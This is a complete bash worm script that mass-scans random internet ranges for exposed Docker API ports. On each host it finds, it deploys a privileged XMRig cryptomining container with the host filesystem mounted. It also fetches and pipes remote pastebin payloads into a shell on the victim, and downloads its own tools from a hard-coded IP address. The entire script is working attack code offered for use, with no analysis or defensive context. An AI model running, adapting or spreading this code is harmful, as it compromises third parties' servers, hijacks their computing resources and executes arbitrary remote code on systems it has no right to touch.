#!/bin/bash

clear
SCAN_T=500000
SOURCE_URL="http://45.9.148.35"
LOG_FILE="./spread_docker.log"

PWNTAINER="xululol/xmrig"
PWNWWWLNK="https://pastebin.com/raw/dNm3FiAc"

LAN_RANGES=("10.0.0.0/8" "172.16.0.0/12" "192.168.0.0/16" "169.254.0.0/16" "100.64.0.0/10")

PACK_ARRAY=("wget" "curl" "jq" "bash" "masscan" "gcc" "make" "libpcap-dev" "docker.io" "docker" "docker-ce")
TIME1OUT="300"
TIME2OUT="300"
NORMAL='\033[0;39m'
BLUE='\033[1;34m'
GREEN='\033[1;32m'
RED='\033[1;31m'

function log() {
    echo -e "${BLUE}[$(date '+%Y-%m-%d %H:%M:%S')] $@${NORMAL}" | tee -a "$LOG_FILE"
}

function init_main(){
    log "Initializing main function"
    setup_this_spreader
    check_spreader_setup
    feed_the_ranges
}

function setup_this_spreader(){
    log "Setting up the spreader"
    if type apk >/dev/null 2>&1; then log "Updating apk"; apk update >/dev/null 2>&1 ; fi
    if type apt-get >/dev/null 2>&1; then log "Updating apt-get"; apt-get update --fix-missing >/dev/null 2>&1 ; fi
    if type yum >/dev/null 2>&1; then log "Cleaning yum"; yum clean all >/dev/null 2>&1 ; fi

    for SET_PACK in "${PACK_ARRAY[@]}" ; do 
        log "Installing package: $SET_PACK"
        if type apk >/dev/null 2>&1; then apk add "$SET_PACK" >/dev/null 2>&1 ; fi
        if type apt-get >/dev/null 2>&1; then apt-get install -y "$SET_PACK" >/dev/null 2>&1 ; fi
        if type yum >/dev/null 2>&1; then yum install -y "$SET_PACK" >/dev/null 2>&1 ; fi
    done

    if [ ! -f "/usr/bin/zgrab" ]; then 
        log "Downloading and setting up zgrab"
        wget -qO- https://pastebin.com/raw/wcGhSPqJ | bash >/dev/null 2>&1
    fi

    if ! type masscan >/dev/null 2>&1; then 
        log "Downloading and setting up masscan"
        wget -qO /var/tmp/mass.tar.gz "$SOURCE_URL/bin/mass.tar.gz"
        tar xvf /var/tmp/mass.tar.gz -C /var/tmp/ >/dev/null 2>&1 && cd /var/tmp/mass/ && rm -f /var/tmp/mass.tar.gz >/dev/null 2>&1
        make >/dev/null 2>&1 && cp bin/masscan /usr/bin/masscan >/dev/null 2>&1 && chmod +x /usr/bin/masscan >/dev/null 2>&1
        make install >/dev/null 2>&1 && cd / >/dev/null 2>&1 && rm -fr /var/tmp/mass/ >/dev/null 2>&1
    fi

    if ! type docker >/dev/null 2>&1; then 
        log "Installing Docker"
        curl -sSL https://get.docker.com | bash >/dev/null 2>&1
    fi

    # Ensure log file is writable
    touch "$LOG_FILE"
    chmod a+w "$LOG_FILE"
}

function check_spreader_setup(){
    clear
    log "Checking spreader setup"
    TOOLS_ARRAY=("wget" "curl" "docker" "masscan" "jq" "zmap")
    for CHECKTOOL in "${TOOLS_ARRAY[@]}" ; do
        if type "$CHECKTOOL" >/dev/null 2>&1; then 
            log "$GREEN FOUND: $CHECKTOOL Install OKAY! $NORMAL"
        else
            log "$RED MISSING: $CHECKTOOL Install FAIL! $NORMAL"
            exit 1
        fi
    done
}

function dAPIpwn(){
    local range=$1
    local port=$2
    local rate=$3
    log "Running masscan on range: $range, port: $port, rate: $rate"

    local masscan_output
    masscan_output=$(masscan --router-mac 66-55-44-33-22-11 "$range".0.0.0/8 -p"$port" --rate="$rate" 2>&1)
    if [ $? -ne 0 ]; then
        log "$RED Masscan failed: $masscan_output $NORMAL"
        return
    fi

    local ips
    ips=$(echo "$masscan_output" | awk '/open/ {print $6}' | xargs)
    if [ -z "$ips" ]; then
        log "$BLUE No IPs found in masscan output $NORMAL"
        return
    fi

    for ipaddy in $ips; do
        log "Found IP: $ipaddy"
        echo "$ipaddy" >> "$LOG_FILE"
        log "Attempting to run Docker commands on $ipaddy"
        sudo timeout -s SIGKILL "$TIME1OUT" docker -H "tcp://$ipaddy:$port" run -d --net host --restart always --privileged --name dockerlan -v /:/host "$PWNTAINER" 2>&1 | tee -a "$LOG_FILE"
        sudo timeout -s SIGKILL "$TIME2OUT" docker -H "tcp://$ipaddy:$port" run -d --net host --privileged -v /:/mnt alpine chroot bash -c 'apk update; apk add bash curl wget; apt update; apt install -y bash curl wget; yum install -y bash curl wget; wget -q -O - '"$PWNWWWLNK"' | sh || curl -s '"$PWNWWWLNK"' | bash' 2>&1 | tee -a "$LOG_FILE"
    done
}

function feed_the_ranges(){
    while true; do
        log "Feeding ranges"
        for range in "${LAN_RANGES[@]}"; do
            RAN_GEN=$((RANDOM%255+1))
            log "Generated random range: $RAN_GEN"
            dAPIpwn "$RAN_GEN" 2375 "$SCAN_T"
            dAPIpwn "$RAN_GEN" 2376 "$SCAN_T"
            dAPIpwn "$RAN_GEN" 2377 "$SCAN_T"
            dAPIpwn "$RAN_GEN" 4244 "$SCAN_T"
            dAPIpwn "$RAN_GEN" 4243 "$SCAN_T"
            sleep 5  # Wait before scanning again
        done
    done
}

init_main
